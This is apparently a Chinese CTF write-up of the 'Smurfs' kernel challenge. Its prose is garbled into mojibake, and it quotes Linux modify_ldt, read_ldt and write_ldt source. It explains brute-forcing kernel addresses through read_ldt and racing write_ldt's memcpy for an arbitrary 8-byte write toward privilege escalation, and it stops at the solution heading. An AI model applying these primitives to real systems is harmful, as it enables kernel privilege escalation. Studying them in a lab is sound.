          <h1 id="è“å¸½æ¯åŠå†³èµ›-Smurfså¤ç°"><a href="#è“å¸½æ¯åŠå†³èµ›-Smurfså¤ç°" class="headerlink" title="è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°"></a>è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æä¾›äº†del,add,editï¼Œå…¶ä¸­æœ‰æ¯”è¾ƒè£¸çš„uaf,editå¯ä»¥ç¼–è¾‘å‰å…«ä¸ªå­—èŠ‚,ä½†æ˜¯æ²¡æœ‰æ³„éœ²åœ°å€çš„åŠŸèƒ½ï¼Œåœ¨æ¯”èµ›æœŸé—´æˆ‘é‡‡ç”¨<code>seq_operations</code>çš„<code>start</code>æŒ‡é’ˆæ¥æ§åˆ¶ç¨‹åºæµï¼Œkernelçš„åœ°å€éšæœºåŒ–åªæœ‰9ä½ï¼Œæ‰€ä»¥é‡‡ç”¨ç¡¬çˆ†çš„ç­–ç•¥æ‰“è¿œç¨‹ï¼Œå¯æƒœè„¸é»‘ï¼Œçˆ†äº†ä¸¤ä¸ªå°æ—¶ï¼Œåˆ°æ¯”èµ›ç»“æŸè¿˜æ˜¯æ²¡æœ‰çˆ†å‡ºæ¥ã€‚è™½æœ‰ä¸€å®šå¯è¡Œæ€§ä½†æ˜¯æ­£è§£è‚¯å®šä¸æ˜¯è¿™æ ·ï¼Œå®˜æ–¹è§£å‡ºæ¥çœ‹äº†çœ‹å‘ç°éå¸¸æœ‰å«é‡‘é‡ï¼Œé‚å¤ç°ä¸€æ³¢ã€‚</p>
<h2 id="ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ "><a href="#ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ " class="headerlink" title="ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ "></a>ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ </h2><h3 id="è¿›ç¨‹ldt"><a href="#è¿›ç¨‹ldt" class="headerlink" title="è¿›ç¨‹ldt"></a>è¿›ç¨‹ldt</h3><p>è™½ç„¶é¢˜ç›®çš„åˆ©ç”¨æ€è·¯å’Œè¿™ä¸ªå…³ç³»ä¸æ˜¯å¾ˆå¤§ï¼Œä½†çœ‹éƒ½çœ‹äº†å°±è®°å½•ä¸€ä¸‹ã€‚</p>
<p>ä»‹ç»LDTå°±ä¸å¾—ä¸ä»‹ç»GDTäº†ï¼Œç®€è€Œè¨€ä¹‹ï¼ŒGDTæ˜¯å…¨å±€æè¿°ç¬¦è¡¨ï¼Œè€ŒLDTæ˜¯å±€éƒ¨æè¿°ç¬¦è¡¨ï¼Œåœ¨kvmçš„å­¦ä¹ ä¸­æ¥è§¦è¿‡GDT,ä½†æ˜¯å½“æ—¶ä¸ç†è§£ä¸ºä»€ä¹ˆåŠ äº†è¿™ä¸ªä¸œè¥¿ä¸ºä»€ä¹ˆå°±å¯ä»¥å®ç°ä¿æŠ¤äº†ï¼Œåœ¨è¯¢é—®<code>Alex</code>å­¦é•¿ä¸€æ³¢åç»ˆäºææ‡‚ï¼Œä»–æ˜¯æ€ä¹ˆå®ç°å†…å­˜ä¿æŠ¤ä»¥åŠè¿›ç¨‹ä½éš”ç¦»çš„äº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220812195333645.png" alt="image-20220812195333645"></p>
<p>ä¸€ä¸ªcpuæœ‰ä¸€ä¸ªå…¨å±€æè¿°ç¬¦è¡¨GDTï¼ŒGDTç›¸å½“äºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ å°±æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œä¸€ä¸ªæ®µæè¿°ç¬¦å°±è®°å½•è¿™ä¸ªæ®µçš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æ®µçš„åŸºåœ°å€æ®µçš„å¤§å°ä¹‹ç±»çš„ï¼Œè¿™ä¸ªæ•°ç»„çš„åœ°å€å­˜å‚¨åœ¨å¯„å­˜å™¨<code>GDTR</code>ä¸­ï¼Œç„¶ååœ¨æ®µå¯„å­˜å™¨ä¸­å°±ä¸ä¼šè®°å½•æ®µçš„å…·ä½“ä¿¡æ¯ï¼Œè€Œæ˜¯è®°å½•ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œé€šè¿‡è¿™ä¸ªæ®µé€‰æ‹©å­å®Œæˆå¯¹æŸä¸€ä¸ªæ®µæè¿°ç¬¦çš„ç´¢å¼•</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/9r91dw9haq.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>æ®µé€‰æ‹©å­åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼Œæè¿°ç´¢å¼•ç¬¦ï¼ŒTL,RPLï¼Œå…¶ä¸­æè¿°ç´¢å¼•ç¬¦å°±æ˜¯ç´¢å¼•æ®µæè¿°ç¬¦çš„ï¼ŒTLæœ‰ä¸¤ç§å¯èƒ½ï¼Œ0ä»£è¡¨åœ¨GDTä¸­å¯»æ‰¾ï¼Œ1ä»£è¡¨åœ¨LDTä¸­å¯»æ‰¾ã€‚</p>
<p>LDTæ˜¯åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å®ç°è¿›ç¨‹é—´éš”ç¦»çš„é‡è¦çš„æœºåˆ¶ï¼Œæ¯ä¸ªLDTéƒ½è®°å½•ä¸€ä¸ªè¿›ç¨‹çš„æ®µçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬cs,ds,ssä¹‹ç±»çš„ï¼Œä¹Ÿæ˜¯ç”±æ®µæè¿°ç¬¦ç»„æˆçš„æ•°ç»„ï¼Œä»–æ˜¯ä¸€æ®µå†…å­˜ï¼Œä¹Ÿå¯ä»¥çœ‹åšä¸€ä¸ªæ®µï¼Œæ‰€ä»¥å¯ä»¥åœ¨GDTä¸­ç”¨ä¸€ä¸ªæè¿°ç¬¦å»è®°å½•ä»–ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå¯„å­˜å™¨LDTRï¼Œä¸è¿‡ä»–ä¸æ˜¯è®°å½•LDTçš„åŸºåœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªé€‰æ‹©å­ï¼Œå½“æ®µå¯„å­˜å™¨çš„TLä½æ˜¯1çš„è¯ï¼Œä»£è¡¨å°±æ˜¯LDTé€‰æ‹©ï¼ŒCPUä¼šæ ¹æ®LDTRä½œä¸ºä¸€ä¸ªç´¢å¼•å»GDTè¡¨ä¸­æ‰¾æè¿°ç¬¦ï¼Œæ‰¾è§çš„æè¿°ç¬¦å°±æ˜¯å¯¹åº”ä¸€ä¸ªLDTåœ°å€ï¼Œç„¶åå†ç”¨å¯¹åº”çš„æ®µå¯„å­˜å™¨çš„indexæ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦ï¼Œå¯è§ï¼Œè¿›ç¨‹ä¹‹é—´çš„LDTRä¸ä¸€æ ·ï¼Œä»–ä»¬çš„LDTå°±ä¸ä¸€æ ·ï¼Œæ®µå¯„å­˜å™¨å°±ä¸ä¸€æ ·ï¼Œè¿›ç¨‹é—´å°±éš”ç¦»äº†ï¼Œæ¯”è¾ƒå½¢è±¡çš„æè¿°å¦‚ä¸‹å¦‚å›¾ã€‚</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/4icmuda124.jpeg?imageView2/2/w/1620" alt="img"></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1878670/czt9jkhxcl.png?imageView2/2/w/1620" alt="img"></p>
<h3 id="modify-ldt-ç³»ç»Ÿè°ƒç”¨"><a href="#modify-ldt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="modify_ldt ç³»ç»Ÿè°ƒç”¨"></a>modify_ldt ç³»ç»Ÿè°ƒç”¨</h3><h4 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h4><p>è¯¥ç»“æ„ä½“æ˜¯0x10å¤§å°çš„ï¼Œç„¶åå‰å…«ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé€šè¿‡uafæˆ‘ä»¬å¾—åˆ°è¿™ä¸ªç»“æ„ä½“ï¼Œç„¶åé€šè¿‡editå¯ä»¥æ§åˆ¶å‰å…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶<code>entries</code>æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        nr_entries;</span><br><span class="line">    <span class="keyword">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code> struct desc_struct</code>å°±æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<h4 id="moddify-ldtç³»ç»Ÿè°ƒç”¨"><a href="#moddify-ldtç³»ç»Ÿè°ƒç”¨" class="headerlink" title="moddify_ldtç³»ç»Ÿè°ƒç”¨"></a>moddify_ldtç³»ç»Ÿè°ƒç”¨</h4><p>å¯ä»¥é€šè¿‡linuxæä¾›çš„<code>modity_ldt</code>æ¥è·å–æˆ–è€…ä¿®æ”¹å½“å‰è¿›ç¨‹çš„LDT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>moddify_ldtç³»ç»Ÿè°ƒç”¨ä¸€å…±æä¾›äº†å››ä¸ªåŠŸèƒ½ï¼Œå‚æ•°æœ‰ä¸‰ä¸ªï¼Œfun,ptr,bytecount,<code>ptr</code>æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç»“æ„ä½“ä¸º<code>user_desc</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>read_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line"> <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"> down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">  retval = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">  bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line"> entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"> <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">  entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">  retval = -EFAULT;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">  <span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">  <span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">   retval = -EFAULT;</span><br><span class="line">   <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"> <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°ä¼šä½¿ç”¨<code>copy_to_user</code>æŠŠldt-&gt;entiresçš„å€¼æ‹·è´åˆ°ä¼ å…¥çš„<code>ptr</code>ä¸­ï¼Œå°±æ˜¯æŠŠè¿™ä¸ªè¿›ç¨‹çš„LDTæ‹·è´åˆ°<code>ptr</code>ä¸­ï¼Œå¦‚æœæ‹·è´ä¸æˆåŠŸï¼Œé‚£å°±ä¼šè¿”å›-1.æˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¿”å›å€¼åˆ¤æ–­æ˜¯å¦è¯»å–æˆåŠŸï¼Œä¹Ÿå°±æ˜¯å¯ä»¥çˆ†ç ´å‡ºheapæˆ–è€…kernelåœ°å€ã€‚</p>
<p><strong>write_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"> <span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> error = -EFAULT;</span><br><span class="line"> <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  <span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">     LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">  <span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">   error = -EINVAL;</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   ldt.avl = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">  <span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line"> old_ldt       = mm-&gt;context.ldt;</span><br><span class="line"> old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line"> new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line"> error = -ENOMEM;</span><br><span class="line"> new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"> <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (old_ldt)</span><br><span class="line">  <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"> new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"> finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment">  * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment">  * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment">  * them over to the new LDT.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">if</span> (error) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment">   * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment">   * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">   free_ldt_pgtables(mm);</span><br><span class="line">  free_ldt_struct(new_ldt);</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> install_ldt(mm, new_ldt);</span><br><span class="line"> unmap_ldt_struct(mm, old_ldt);</span><br><span class="line"> free_ldt_struct(old_ldt);</span><br><span class="line"> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"> <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°é‡æ–°ç”³è¯·ä¸€ä¸ªldtç»“æ„ä½“ç»‘å®šåˆ°è¿›ç¨‹ä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨uafæ§åˆ¶è¿™ä¸ªç»“æ„é¢˜ï¼Œç„¶åå°±å¯ä»¥æ§åˆ¶å…¶ä¸­çš„<code>entries</code>äº†ã€‚</p>
<p>è¿™ä¸ªå‡½æ•°å¤„ç†å¯ä»¥æ§åˆ¶ldtä»¥å¤–è¿˜å¯ä»¥å®Œæˆä»»æ„å†™ï¼Œè§‚å¯Ÿä¸‹é¢çš„ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>memcpy</code>å‡½æ•°ä¸­ï¼Œæ‹·è´çš„å¤§å°æ˜¯<code>old_nr_entries * LDT_ENTRY_SIZE</code>,å…¶ä¸­<code>old_nr_entries</code>çš„ä¸Šé™å’Œ<code>LDT_ENTRY_SIZE</code>å¤§å°éƒ½æœ‰å®šä¹‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure>

<p>å¯è§è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œç„¶åè¿˜æ²¡æœ‰åŠ é”ï¼Œé‚£å°±å¯ä»¥åœ¨<code>memcpy</code>æ‹·è´çš„æœŸé—´æ¡ä»¶ç«äº‰ä¿®æ”¹<code>entries</code>å­—æ®µï¼Œldtä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼ï¼Œå†æ‰§è¡Œ<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>å°±å¯ä»¥å®Œæˆä»»æ„åœ°å€å†™å…«å­—èŠ‚äº†ã€‚</p>
<h2 id="è§£æ³•ä¸€-éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ"><a href="#è§£æ³•ä¸€-éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ" class="headerlink" title="è§£æ³•ä¸€ éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ"></a>è§£æ³•ä¸€ éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ</h2><p>è¯¥è§£æ³•æ€è·¯ä¸»è¦å‚è€ƒ<code>TCTF FINAL</code>çš„ä¸€é“kernelpwné¢˜ã€‚</p>
